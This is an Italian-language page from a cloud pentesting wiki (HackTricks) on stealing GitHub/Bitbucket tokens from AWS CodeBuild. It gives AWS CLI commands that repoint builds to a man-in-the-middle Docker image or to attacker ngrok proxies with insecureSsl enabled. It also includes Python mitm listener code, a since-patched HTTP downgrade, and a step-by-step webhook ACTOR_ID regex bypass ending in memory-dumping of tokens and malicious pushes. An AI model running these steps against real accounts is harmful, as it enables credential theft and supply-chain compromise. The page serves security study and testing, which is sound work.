# AWS Codebuild - Token Leakage

{{#include ../../../../banners/hacktricks-training.md}}

## Recuperare token configurati di Github/Bitbucket

Per prima cosa, controlla se ci sono credenziali sorgente configurate che potresti leak:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

Se riscontri che l'autenticazione, per esempio a Github, è impostata nell'account, puoi **exfiltrate** quell'**access** (**GH token or OAuth token**) facendo in modo che Codebuild **use an specific docker image** per eseguire il build del progetto.

A questo scopo puoi **creare un nuovo Codebuild project** o cambiare l'**environment** di uno esistente per impostare la **Docker image**.

The Docker image you could use is [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Questa è una Docker image molto basilare che imposterà le **env variables `https_proxy`**, **`http_proxy`** e **`SSL_CERT_FILE`**. Questo ti permetterà di intercettare la maggior parte del traffico dell'host indicato in **`https_proxy`** e **`http_proxy`** e di fidarti del certificato SSL indicato in **`SSL_CERT_FILE`**.

1. **Create & Upload your own Docker MitM image**
- Segui le istruzioni del repo per impostare il tuo proxy IP e il certificato SSL e **build the docker image**.
- **DO NOT SET `http_proxy`** per non intercettare le richieste verso l'endpoint dei metadata.
- Puoi usare **`ngrok`** come `ngrok tcp 4444` per impostare il proxy verso il tuo host
- Una volta che hai buildato la Docker image, **upload it to a public repo** (Dockerhub, ECR...)
2. **Set the environment**
- Crea un **nuovo Codebuild project** o **modifica** l'ambiente di uno esistente.
- Imposta il progetto per usare la **Docker image precedentemente generata**

<figure><img src="../../../../images/image (23).png" alt=""><figcaption></figcaption></figure>

3. **Set the MitM proxy in your host**

- Come indicato nel **Github repo** potresti usare qualcosa del tipo:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
> [!TIP]
> È stata usata la **mitmproxy version used was 9.0.1**; è stato segnalato che con la versione 10 questo potrebbe non funzionare.

4. **Esegui la build & cattura le credenziali**

- Puoi vedere il token nell'header **Authorization**:

<figure><img src="../../../../images/image (273).png" alt=""><figcaption></figcaption></figure>

Questo può essere fatto anche dall'aws cli con qualcosa come
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### Tramite insecureSSL

**Codebuild** projects have a setting called **`insecureSsl`** that is hidden in the web you can only change it from the API.\\
Abilitandola, si permette a Codebuild di connettersi al repository **senza verificare il certificato** offerto dalla piattaforma.

- Prima devi enumerare la configurazione corrente con qualcosa del tipo:
```bash
aws codebuild batch-get-projects --name <proj-name>
```
- Poi, con le informazioni raccolte puoi aggiornare l'impostazione del progetto **`insecureSsl`** su **`True`**. Di seguito un esempio del mio aggiornamento di un progetto — nota **`insecureSsl=True`** alla fine (questa è l'unica cosa che devi cambiare rispetto alla configurazione raccolta).
- Inoltre, aggiungi anche le variabili d'ambiente **http_proxy** e **https_proxy** che puntano al tuo tcp ngrok come:
```bash
aws codebuild update-project --name <proj-name> \
--source '{
"type": "GITHUB",
"location": "https://github.com/carlospolop/404checker",
"gitCloneDepth": 1,
"gitSubmodulesConfig": {
"fetchSubmodules": false
},
"buildspec": "version: 0.2\n\nphases:\n  build:\n    commands:\n       - echo \"sad\"\n",
"auth": {
"type": "CODECONNECTIONS",
"resource": "arn:aws:codeconnections:eu-west-1:947247140022:connection/46cf78ac-7f60-4d7d-bf86-5011cfd3f4be"
},
"reportBuildStatus": false,
"insecureSsl": true
}' \
--environment '{
"type": "LINUX_CONTAINER",
"image": "aws/codebuild/standard:5.0",
"computeType": "BUILD_GENERAL1_SMALL",
"environmentVariables": [
{
"name": "http_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
},
{
"name": "https_proxy",
"value": "http://2.tcp.eu.ngrok.io:15027"
}
]
}'
```
- Poi, esegui l'esempio di base da [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) sulla porta indicata dalle variabili proxy (http_proxy e https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Finalmente, clicca su **Build the project**, le **credenziali** saranno **inviate in chiaro** (base64) alla porta mitm:

<figure><img src="../../../../images/image (1) (1).png" alt=""><figcaption></figcaption></figure>

### ~~Via protocollo HTTP~~

> [!TIP] > **Questa vulnerability è stata corretta da AWS in qualche momento della settimana del 20th of Feb of 2023 (I think on Friday). So an attacker can't abuse it anymore :)**

Un attacker con **permessi elevati su un CodeBuild potrebbe leak il token di Github/Bitbucket** configurato oppure, se i permessi erano configurati via OAuth, il **token OAuth temporaneo usato per accedere al codice**.

- Un attacker potrebbe aggiungere le variabili d'ambiente **http_proxy** e **https_proxy** al progetto CodeBuild puntando alla sua macchina (per esempio `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../images/image (232).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../images/image (213).png" alt=""><figcaption></figcaption></figure>

- Poi, cambia l'URL del repo di github per usare HTTP invece di HTTPS, per esempio: `http://github.com/carlospolop-forks/TestActions`
- Poi, esegui l'esempio base da [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) sulla porta indicata dalle variabili proxy (http_proxy e https_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="0.0.0.0",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
- Successivamente, fai clic su **Compila il progetto** oppure avvia la build dalla riga di comando:
```sh
aws codebuild start-build --project-name <proj-name>
```
- Infine, le **credenziali** saranno **inviate in chiaro** (base64) alla porta mitm:

<figure><img src="../../../../images/image (159).png" alt=""><figcaption></figcaption></figure>

> [!WARNING]
> Ora un attaccante potrà usare il token dalla sua macchina, elencare tutti i privilegi che possiede e (ab)usarli più facilmente rispetto all'uso diretto del servizio CodeBuild.

## Webhook filter ACTOR_ID regex allowlist bypass (PR-triggered privileged builds)

Webhooks GitHub di CodeBuild mal configurati che usano regex `ACTOR_ID` non ancorate permettono a PR *non attendibili* di avviare build privilegiate. Se l'allowlist è del tipo `123456|7890123` senza `^`/`$`, qualsiasi ID che contenga una di queste sottostringhe corrisponde. Poiché gli ID utente di GitHub sono sequenziali, un attaccante può gareggiare per registrare un ID “eclipsing” (una superstringa di un ID attendibile) e innescare la build.

## Percorso di exploit

1. Individuare progetti CodeBuild pubblici che espongono filtri webhook ed estrarre un'allowlist `ACTOR_ID` non ancorata.
2. Ottenere un ID GitHub eclipsing:
- Campionare il contatore globale degli ID creando/eliminando org GitHub (gli org ID condividono il pool).
- Pre-creare molteplici manifest di GitHub App e attivare gli URL di conferma quando il contatore è entro ~100 ID dal target per registrare rapidamente un bot con un ID che contiene la sottostringa attendibile.
3. Aprire una PR dall'account eclipsing; la regex corrisponde alla sottostringa e la build privilegiata viene avviata.
4. Usare build RCE (es. hook di installazione delle dipendenze) per dumpare la memoria del processo che gestisce le credenziali GitHub e recuperare il PAT/OAuth token.
5. Con il token dotato dello scope `repo`, invitare il proprio account come collaborator/admin e pushare/approvare commit malevoli o esfiltrare segreti.

## References
- [Wiz: CodeBreach – AWS CodeBuild ACTOR_ID regex bypass and token theft](https://www.wiz.io/blog/wiz-research-codebreach-vulnerability-aws-codebuild)

{{#include ../../../../banners/hacktricks-training.md}}
